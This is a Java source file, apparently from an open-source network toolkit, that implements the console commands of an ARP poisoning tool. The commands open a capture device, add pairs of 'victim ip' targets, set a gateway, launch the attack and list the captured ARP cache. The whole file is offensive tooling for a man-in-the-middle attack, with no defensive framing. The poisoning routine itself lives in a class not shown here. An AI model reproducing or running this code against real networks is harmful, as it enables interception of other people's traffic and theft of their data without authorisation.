/*
 * Copyright 2010 NCHOVY
 * 
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 * http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
 package org.krakenapps.stormbringer.impl;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Map;

import org.krakenapps.api.Script;
import org.krakenapps.api.ScriptArgument;
import org.krakenapps.api.ScriptContext;
import org.krakenapps.api.ScriptUsage;
import org.krakenapps.pcap.decoder.ethernet.MacAddress;
import org.krakenapps.pcap.live.PcapDevice;
import org.krakenapps.pcap.live.PcapDeviceManager;
import org.krakenapps.pcap.live.PcapDeviceMetadata;
import org.krakenapps.stormbringer.ArpPoisoner;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class StormScript implements Script {
	private final Logger logger = LoggerFactory.getLogger(StormScript.class.getName());

	private ArpPoisoner arpPoisoner;
	private ScriptContext context;

	public StormScript(ArpPoisoner arpPoisoner) {
		this.arpPoisoner = arpPoisoner;
	}

	@Override
	public void setScriptContext(ScriptContext context) {
		this.context = context;
	}

	public void run(String[] args) {
		arpPoisoner.attack();
		context.println("completed");
	}
	
	// will be removed
	public void setGateway(String[] args) throws UnknownHostException {
		arpPoisoner.setGateway(InetAddress.getByName(args[0]));
	}

	public void open(String[] args) throws NumberFormatException, InterruptedException {
		for (PcapDeviceMetadata d : PcapDeviceManager.getDeviceMetadataList()) {
			context.println(d.toString());
		}

		context.print("Select device? ");
		int select = Integer.valueOf(context.readLine());

		try {
			PcapDeviceMetadata metadata = PcapDeviceManager.getDeviceMetadataList().get(select);
			PcapDevice device = PcapDeviceManager.open(metadata.getName(), 1000);

			arpPoisoner.addAdapter(device);
			context.println("device opened");
		} catch (IOException e) {
			context.println(e.getMessage());
			logger.error("open failed", e);
		}
	}

	public void close(String[] args) {

	}

	@ScriptUsage(description = "add arp poisoning target", arguments = {
			@ScriptArgument(name = "victim ip 1", type = "string", description = "victim ip 1"),
			@ScriptArgument(name = "victim ip 2", type = "string", description = "victim ip 2") })
	public void addArpTarget(String[] args) throws InterruptedException {
		try {
			InetAddress peer1 = InetAddress.getByName(args[0]);
			InetAddress peer2 = InetAddress.getByName(args[1]);

			if (peer1.equals(peer2)) {
				context.println("ip should be different");
				return;
			}

			arpPoisoner.addTarget(peer1, peer2);
			context.println("target added");
		} catch (Exception e) {
			context.println(e.getMessage());
		}
	}

	public void hosts(String[] args) {
		Map<InetAddress, MacAddress> arpCache = arpPoisoner.getArpCache();

		for (InetAddress ip : arpCache.keySet()) {
			context.println(ip + ": " + arpCache.get(ip));
		}
	}
}
